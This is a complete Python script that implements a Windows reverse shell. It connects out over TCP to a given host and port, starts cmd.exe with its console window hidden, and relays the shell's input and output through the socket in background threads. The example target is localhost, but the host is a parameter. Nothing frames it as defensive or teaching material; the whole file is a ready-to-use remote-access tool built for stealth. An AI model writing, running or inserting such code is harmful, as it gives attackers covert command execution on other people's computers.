
def reverse_shell(host, port):
    import socket
    import subprocess
    import threading

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    # creationflags for Windows to hide the console window (optional)
    #   DETACHED_PROCESS = 0x00000008
    #   CREATE_NO_WINDOW = 0x08000000
    #   CREATE_NEW_CONSOLE = 0x00000010
    # For a hidden window:
    CREATE_NO_WINDOW = 0x08000000

    # Launch cmd.exe with pipes for stdin, stdout, and stderr
    p = subprocess.Popen(
        ["cmd.exe"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        shell=True,
        creationflags=CREATE_NO_WINDOW
    )

    def read_from_process(pipe):
        """ Continuously read the subprocess pipe (stdout or stderr) 
            and forward it to the socket. """
        while True:
            data = pipe.read(1)  # read one byte at a time
            if not data:
                break
            s.sendall(data)

    def write_to_process():
        """ Continuously read data from the socket and write it 
            into the subprocess's stdin. """
        while True:
            try:
                data = s.recv(1024)
            except:
                break

            if not data:
                break
            p.stdin.write(data)
            p.stdin.flush()

    # Create threads:
    #   t1 reads stdout -> socket
    #   t2 reads stderr -> socket
    #   t3 reads socket -> stdin
    t1 = threading.Thread(target=read_from_process, args=(p.stdout,))
    t2 = threading.Thread(target=read_from_process, args=(p.stderr,))
    t3 = threading.Thread(target=write_to_process)

    for t in (t1, t2, t3):
        t.daemon = True
        t.start()

    # Wait for them to finish (they usually won't until the connection breaks)
    t1.join()
    t2.join()
    t3.join()

    # Clean up
    s.close()
    try:
        p.kill()  # or p.terminate()
    except:
        pass

if __name__ == "__main__":
    HOST = "127.0.0.1"
    PORT = 5002
    reverse_shell(HOST, PORT)
